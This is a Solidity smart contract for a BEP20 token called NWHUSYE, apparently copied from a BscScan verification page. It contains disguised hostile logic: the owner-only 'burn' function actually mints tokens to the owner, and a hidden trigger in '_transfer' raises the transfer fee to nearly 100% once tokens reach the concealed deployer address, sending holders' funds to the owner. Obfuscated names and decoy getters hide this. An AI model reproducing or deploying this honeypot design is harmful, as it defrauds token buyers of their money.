/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.7.5;
contract NWHUSYE {
address private  AFTKTO = address(0);
uint256 private  SGMCSA = 1000000000000000000000;
address private  YBJFWR = address(0);
address public owner;
uint256 private  EXJLGV = 100000000;
string public  name = "NWHUSYE";
uint256 private  NUADHE = 1000000000000000;
uint256 public constant RZCZIM = 999999;
string public  symbol = "NWHUSYE";
uint256 private  PFXCHY = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  QWAYCP = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address private  CUQKRM = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  GHFVJG = 10000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  WOYAPA = 10000000000000;
address private  HLYUNR = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  EQSKTQ = address(0);
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZQNMYA 0");
require(spender != address(0), "fZQNMYA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getHLYUNR() private returns (address) {
return HLYUNR;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getEQSKTQ() private returns (address) {
return EQSKTQ;
}

function _getAFTKTO() private returns (address) {
return AFTKTO;
}

function _getYBJFWR() private returns (address) {
return YBJFWR;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getEXJLGV() private returns (uint256) {
return EXJLGV;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
CUQKRM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getWOYAPA() private returns (uint256) {
return WOYAPA;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGHFVJG() private returns (uint256) {
return GHFVJG;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getQWAYCP() private returns (uint256) {
return QWAYCP;
}

function _getSGMCSA() private returns (uint256) {
return SGMCSA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZQNMYA");
require(to != address(0), "ZQNMYA");
require(amount <= balanceOf[from], "ZQNMYA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RZCZIM/PFXCHY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==CUQKRM){
PFXCHY = RZCZIM+2;
}
emit Transfer(from, to, transferAmount);
}
function _getNUADHE() private returns (uint256) {
return NUADHE;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}